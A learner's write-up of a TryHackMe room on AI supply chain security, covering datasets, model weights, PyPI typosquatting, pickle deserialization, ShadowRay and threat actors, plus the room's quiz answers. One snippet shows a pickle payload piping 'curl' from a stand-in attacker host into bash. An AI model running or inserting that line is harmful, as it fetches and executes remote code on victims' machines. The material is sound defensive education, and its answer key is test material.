# 🏠 Understanding AI Supply Chains — TryHackMe AI Security Path

> **Section:** Section 4 — AI Supply Chain Security | **Difficulty:** Medium | **Type:** Theory  
> **Room Link:** [https://tryhackme.com/room/understanding-ai-supply-chains](https://tryhackme.com/room/understanding-ai-supply-chains)  
> **Completed:** 25/05/2026

---

## 📋 Room Overview

The AI supply chain is the full pipeline of components, dependencies, and services that go into building and deploying an AI system — from raw training data and third-party model weights all the way to the cloud infrastructure serving predictions in production. Just like the software supply chain attacks that defined the SolarWinds and XZ Utils incidents, **the AI supply chain is a high-value, low-visibility attack surface**.

This room maps out every link in the AI supply chain, explains why each link is a potential compromise point, and introduces the threat actors, motivations, and real-world incidents that make this category so critical to understand.

**What you'll learn:**
- The end-to-end anatomy of an AI supply chain.
- Key components: datasets, pre-trained models, ML frameworks, serving infrastructure.
- Why AI supply chains are uniquely dangerous compared to traditional software supply chains.
- Real-world AI supply chain incidents and their consequences.
- Threat actor profiles and motivations for targeting AI pipelines.

---

## 🧠 Key Concepts

### The AI Supply Chain: End-to-End Map

```
┌─────────────────────────────────────────────────────────────────────┐
│                    AI SUPPLY CHAIN                                   │
│                                                                     │
│  [Data Sources]──►[Data Pipeline]──►[Pre-trained Models]            │
│       │                │                    │                       │
│  Web scrapes      ETL scripts          HuggingFace Hub              │
│  Public datasets  Data labelling       PyPI packages                │
│  Synthetic data   Feature stores       Model registries             │
│                                              │                      │
│                              [Fine-tuning / Training]               │
│                                              │                      │
│                              [Model Packaging & Registry]           │
│                                              │                      │
│                              [Serving Infrastructure]               │
│                                              │                      │
│                              [End User / Application]               │
└─────────────────────────────────────────────────────────────────────┘
```

**Each arrow is a trust boundary. Each component is a potential compromise point.**

### Component 1 — Training Data

Training data is the **genome** of a machine learning model. What goes into the data determines what the model learns — including any malicious behaviors baked in by an attacker.

**Sources of training data risk:**
- **Web-scraped datasets** (Common Crawl, LAION) — anyone can influence what gets scraped by controlling web content.
- **Third-party data vendors** — opaque provenance, no audit trail.
- **Open annotation platforms** — crowdsourced labellers can insert mislabelled or poisoned samples.
- **Synthetic data generators** — if the generator itself is compromised, all generated data is tainted.

### Component 2 — Pre-trained Model Weights

The explosion of open model sharing (Hugging Face, Ollama, Civitai) means most organizations build on **third-party pre-trained weights** rather than training from scratch. These weights are binary blobs — **there is no "source code review" equivalent for model weights**.

**Key risks:**
- Weights can be modified post-training to embed backdoors.
- Model serialization formats (Pickle, SafeTensors, ONNX) can carry **malicious executable payloads**.
- Weight provenance is almost never cryptographically verified.

### Component 3 — ML Frameworks & Libraries

The Python ML ecosystem is vast and loosely governed:

| Ecosystem Risk | Example |
|----------------|---------|
| **Typosquatting** | `torchvision` vs `torch-vision` — malicious package with similar name |
| **Dependency confusion** | Internal package name claimed on public PyPI |
| **Compromised maintainer** | Supply chain attack via account takeover of a popular package |
| **Transitive dependencies** | 3 levels deep in `requirements.txt` — do you know all 847 packages? |

### Component 4 — ML Pipeline Infrastructure

The compute infrastructure running training and inference is highly privileged:
- Training clusters with access to petabytes of sensitive data.
- Model registries (MLflow, Weights & Biases, Neptune) storing all model versions.
- CI/CD pipelines that automatically retrain and deploy models.
- **A compromised MLOps pipeline can silently retrain and redeploy a backdoored model.**

### Component 5 — Serving Infrastructure

The model inference layer faces traditional web application attacks **plus** AI-specific ones:
- Container images with embedded malware.
- Misconfigured inference APIs exposing admin endpoints.
- GPU instances with cryptomining malware consuming expensive compute.

### Why AI Supply Chains Are Uniquely Dangerous

| Property | Traditional Software | AI Supply Chains |
|----------|---------------------|-----------------|
| **Auditability** | Source code is human-readable | Model weights are binary, opaque |
| **Provenance** | Git history, signed commits | Almost no equivalent standard |
| **Blast radius** | Affects users of that software | Affects all downstream fine-tuned models |
| **Detection** | Static analysis, CVE scanners | No equivalent weight-scanning tools |
| **Exploit payload** | Code/binary | Data, gradients, backdoor triggers |

---

## 📝 Task Walkthrough

### Task 1 — Anatomy of the AI Supply Chain

**Summary:** Mapping the complete set of components from data collection to production deployment and identifying the trust assumptions at each stage.

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What is the term for the complete set of tools, services, data, and components that go into building and deploying an AI model? | `AI Supply Chain` |
| Which supply chain component represents the biggest "opaque binary" risk — containing learned behaviors that cannot be easily inspected? | `Pre-trained model weights` |
| What traditional software supply chain attack class targets ML packages by registering malicious packages with names similar to internal ones? | `Dependency confusion` |

**Notes:**
> The most underappreciated attack surface is the **model registry**. In most MLOps workflows, models are automatically promoted from staging to production based on benchmark performance — not security checks. A backdoored model that performs well on benchmarks will sail straight into production.

---

### Task 2 — Real-World AI Supply Chain Incidents

**Summary:** Case studies of confirmed and suspected AI supply chain attacks and near-misses.

**Case Study 1 — The Hugging Face Malicious Pickle Incident (2023):**
Researchers discovered **over 100 malicious model repositories** on Hugging Face containing models serialized with Python Pickle format. Pickle files can execute arbitrary Python code on deserialization — meaning simply *downloading and loading* the model was enough to compromise the victim's machine.

**Payload embedded in malicious `.pkl` file:**
```python
# Pickle deserialization executes this automatically on load
import os
os.system("curl http://attacker.io/c2 | bash")
```

**Case Study 2 — Poisoned PyPI Packages Targeting ML Engineers (2023):**
Multiple campaigns deployed packages with names like `torchserve-api`, `ml-utils-core`, and `sklearn-extended` to PyPI. When installed (often via `pip install` from a README or tutorial blog), they executed credential-stealing malware targeting AWS keys, Hugging Face tokens, and Weights & Biases API keys.

**Case Study 3 — ShadowRay — Anyscale Ray Framework RCE (2024):**
CVE-2023-48022 — A critical unauthenticated RCE in Anyscale's Ray distributed ML training framework was actively exploited in the wild. Attackers gained access to ML training clusters, exfiltrated model weights, and deployed cryptominers on expensive GPU infrastructure. Estimated thousands of compromised clusters.

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What Python serialization format is particularly dangerous for ML model distribution because it executes arbitrary code on deserialization? | `Pickle (.pkl)` |
| What is the name of the CVE affecting Anyscale Ray that allowed unauthenticated RCE on ML training clusters? | `CVE-2023-48022` |
| What type of credentials are ML-targeting PyPI malware packages primarily designed to steal? | `Cloud API keys (AWS), ML platform tokens (Hugging Face, W&B)` |

**Notes:**
> The Pickle vulnerability is a perfect microcosm of why AI supply chains are dangerous: the ML community *standardized* on a format that was **never designed for untrusted content**. Pickle was a Python IPC mechanism, not a secure model serialization format — but it became the de facto standard. The safer alternative, SafeTensors (developed by Hugging Face), deserializes only tensor data with no code execution.

---

### Task 3 — Threat Actor Profiles

**Summary:** Understanding who attacks AI supply chains and why.

| Threat Actor | Motivation | Typical Technique |
|-------------|------------|-------------------|
| **Nation-State APTs** | Intelligence collection, IP theft, sabotage of adversary AI capabilities | Long-term access to training infrastructure; subtle model backdooring |
| **Cybercriminal Groups** | Financial gain via cryptomining on GPU clusters, credential theft | Malicious PyPI packages, Pickle exploits |
| **Competitors** | Corporate espionage, model theft | Exfiltrating proprietary model weights |
| **Insider Threats** | Sabotage, personal gain | Poisoning training data, leaking weights |
| **Hacktivists** | Ideological sabotage of AI systems | Dataset poisoning to cause model bias or failure |

**Questions & Answers:**

| Question | Answer |
|----------|--------|
| What threat actor type would be most likely to embed a subtle long-term backdoor in a widely-used open-source ML framework? | `Nation-State APT` |
| What is the primary financial motivation for criminal groups targeting ML training infrastructure specifically (rather than general servers)? | `Cryptomining — GPU clusters provide massive parallel compute for mining cryptocurrency` |
| What insider threat action could compromise an entire product line of AI models without leaving obvious traces? | `Training data poisoning — subtly altering training samples to introduce model bias or hidden backdoors` |

---

## 💡 Personal Takeaways

- AI supply chain security is essentially **traditional supply chain security + 3 new dimensions**: model weights (opaque binary artifacts), training data (an entirely new attack medium), and AI-specific infrastructure (GPU clusters, model registries, MLOps pipelines).
- The **Pickle vulnerability** is a symptom of a deeper cultural problem: the ML community moved fast and adopted powerful tools without security review. The ecosystem is gradually improving (SafeTensors, signed model cards), but millions of existing `.pkl` files in the wild remain dangerous.
- The **trust model in ML is broken by default**. `pip install` + `model.load()` in a Jupyter notebook is how most data scientists operate — and both steps can silently execute attacker code. Security hygiene in ML workflows is years behind the application security world.
- AI supply chain attacks have an enormous **multiplicative blast radius**. A backdoor injected into a popular open-source pre-trained model (like an early checkpoint of a popular LLM) propagates to every organization that fine-tunes from it — potentially thousands of downstream models.

---

## 🔗 Additional Resources

- [Hugging Face — Security at Scale](https://huggingface.co/docs/hub/security)
- [SafeTensors — Secure Model Serialization](https://github.com/huggingface/safetensors)
- [Trail of Bits — Pickle Security Research](https://blog.trailofbits.com/2021/03/15/never-a-dill-moment-exploiting-machine-learning-pickle-files/)
- [ShadowRay — Oligo Security Research](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [SLSA Framework — Supply Chain Levels for Software Artifacts](https://slsa.dev/)

---

> ⬅️ [Previous Room](../../Section-3-Prompt-Security/05-white-rabbit/README.md) | [Back to Main](../../README.md) | [Next Room](../02-supply-chain-attack-vectors/README.md) ➡️
